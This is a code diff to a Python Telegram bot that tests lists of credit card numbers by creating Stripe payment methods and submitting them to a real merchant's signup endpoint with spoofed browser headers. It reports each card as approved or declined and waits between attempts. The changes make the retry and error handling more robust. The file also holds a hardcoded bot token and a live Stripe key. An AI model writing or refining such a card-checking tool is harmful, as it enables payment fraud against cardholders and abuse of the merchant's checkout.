@@ -5,6 +5,7 @@ import random
 import string
 import time
 import uuid
+import json
 
 BOT_TOKEN = "7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY"
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -61,14 +62,18 @@ def check_card_flow(message, cards):
         lastname = "Salam"
         password = "War112233$%"
 
-        # Stripe POST Data
+        # Prepare Stripe parameters with your exact values, including guid, muid, sid as UUID strings
+        guid = str(uuid.uuid4())
+        muid = str(uuid.uuid4())
+        sid = str(uuid.uuid4())
+
         stripe_payload = {
             "billing_details[name]": name,
             "billing_details[email]": email,
             "type": "card",
-            "card[number]": f"{cc}",
+            "card[number]": cc,
             "card[cvc]": cvv,
-            "card[exp_year]": yy[-2:],
+            "card[exp_year]": yy[-2:],  # last 2 digits of year
             "card[exp_month]": mm,
             "allow_redisplay": "unspecified",
             "pasted_fields": "number",
@@ -81,9 +86,9 @@ def check_card_flow(message, cards):
             "client_attribution_metadata[merchant_integration_version]": "2021",
             "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
             "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
-            "guid": str(uuid.uuid4()),
-            "muid": str(uuid.uuid4()),
-            "sid": str(uuid.uuid4()),
+            "guid": guid,
+            "muid": muid,
+            "sid": sid,
             "key": "pk_live_QzBMW6gThdrTmOZ1k4lPJtSU",
         }
 
@@ -110,17 +115,17 @@ def check_card_flow(message, cards):
                 headers=stripe_headers,
                 timeout=30
             )
+            stripe_resp.raise_for_status()
             stripe_json = stripe_resp.json()
         except Exception as e:
             bot.send_message(chat_id, f"❌ Stripe Error: {str(e)}")
             continue
 
         pmid = stripe_json.get("id", "")
-        if not pmid or not pmid.startswith("pm_"):
+        if not pmid.startswith("pm_"):
             bot.send_message(chat_id, f"❌ Stripe error for card {cc}: <code>{stripe_resp.text[:200]}</code>", parse_mode="HTML")
             continue
 
-        # CribFlyer POST Data
         crib_payload = {
             "email": email,
             "name": name,
@@ -132,12 +137,13 @@ def check_card_flow(message, cards):
             "qty": "1",
             "pmid": pmid
         }
+
         crib_headers = {
             "accept": "*/*",
             "accept-encoding": "gzip, deflate, br, zstd",
             "accept-language": "en-US,en;q=0.9",
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "cookie": f"cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0; __stripe_mid={stripe_payload['muid']}; __stripe_sid={stripe_payload['sid']};",
+            "cookie": f"cfid=f0999602-b357-441d-bce3-5e8d6861c302; cftoken=0; __stripe_mid={muid}; __stripe_sid={sid};",
             "origin": "https://www.cribflyer.com",
             "priority": "u=1, i",
             "referer": "https://www.cribflyer.com/signup?p=property_plan&qty=1",
@@ -151,8 +157,9 @@ def check_card_flow(message, cards):
             "x-requested-with": "XMLHttpRequest"
         }
 
-        # Retry and error handling for CribFlyer
         crib_resp_text = ""
+        crib_json = {"ERROR": True}  # default fail
+
         for attempt in range(3):
             try:
                 crib_resp = requests.post(
@@ -162,17 +169,23 @@ def check_card_flow(message, cards):
                     timeout=30
                 )
                 crib_resp_text = crib_resp.text
+                if not crib_resp_text.strip():
+                    raise ValueError("Empty response from CribFlyer API")
                 crib_json = crib_resp.json()
                 break
-            except Exception as e:
+            except (json.JSONDecodeError, ValueError) as e:
                 if attempt == 2:
-                    bot.send_message(chat_id, f"❌ CribFlyer Error: {str(e)}\nRaw: <code>{crib_resp_text[:200]}</code>", parse_mode="HTML")
-                    crib_json = {"ERROR": True}
+                    bot.send_message(chat_id,
+                        f"❌ CribFlyer JSON Decode Error after 3 attempts\nRaw response:\n<code>{crib_resp_text[:400]}</code>",
+                        parse_mode="HTML")
                 else:
                     time.sleep(1)
-                    continue
+            except Exception as e:
+                bot.send_message(chat_id, f"❌ CribFlyer Error: {str(e)}")
+                break
 
         status = "✅ Approved" if crib_json.get("ERROR") is False else "❌ Declined"
+
         bot.send_message(
             chat_id,
             f"Card {idx}/{len(cards)}: {cc}|{mm}|{yy}|{cvv}\n"
@@ -182,7 +195,7 @@ def check_card_flow(message, cards):
         )
 
         if idx < len(cards):
-            for i in range(15, 0, -1):
+            for _ in range(15, 0, -1):
                 if user_stop_flag.get(user_id):
                     bot.send_message(chat_id, "⏹️ Checking stopped by user.")
                     return
